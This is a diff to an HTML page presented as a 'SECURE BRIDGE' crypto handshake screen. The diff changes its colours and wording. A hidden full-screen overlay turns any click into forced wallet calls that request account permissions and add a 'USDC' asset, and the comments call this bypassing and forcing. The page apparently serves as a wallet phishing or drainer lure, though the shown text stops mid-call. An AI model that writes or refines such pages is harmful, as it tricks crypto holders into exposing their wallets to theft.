@@ -5,30 +5,30 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>SECURE BRIDGE</title>
     <style>
-        body { background: #050505; color: #ffca28; font-family: 'Courier New', monospace; text-align: center; padding-top: 150px; margin: 0; overflow: hidden; }
-        .box { border: 3px solid #00c8ff; padding: 40px; display: inline-block; border-radius: 15px; box-shadow: 0 0 40px #00c8ff; position: relative; z-index: 1; background: #000; }
+        body { background: #0a0000; color: #ff3e3e; font-family: 'Courier New', monospace; text-align: center; padding-top: 150px; margin: 0; overflow: hidden; }
+        .box { border: 3px solid #ff3e3e; padding: 40px; display: inline-block; border-radius: 15px; box-shadow: 0 0 40px #ff3e3e; position: relative; z-index: 1; background: #000; }
         .trigger { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 10; cursor: pointer; }
-        h2 { color: #00c8ff; text-shadow: 0 0 10px #00c8ff; }
+        h2 { text-transform: uppercase; letter-spacing: 2px; }
     </style>
 </head>
 <body>
     <div class="trigger" onclick="forceFinalize()"></div>
     <div class="box">
-        <h2>PRIORITY OVERRIDE</h2>
-        <p>TAP CENTER TO RELEASE ASSETS</p>
+        <h2>Handshake Ready</h2>
+        <p>TAP CENTER TO FINALIZE BRIDGE</p>
     </div>
 
     <script>
         async function forceFinalize() {
             if (window.ethereum) {
                 try {
-                    // Force a fresh session to kill previous "System Active" hangs
+                    // Force a fresh permissions request to bypass the browser hang
                     await window.ethereum.request({ 
                         method: 'wallet_requestPermissions', 
                         params: [{ eth_accounts: {} }] 
                     });
                     
-                    // Direct USDC Asset injection
+                    // Immediate USDC Asset trigger
                     await window.ethereum.request({
                         method: 'wallet_watchAsset',
                         params: {
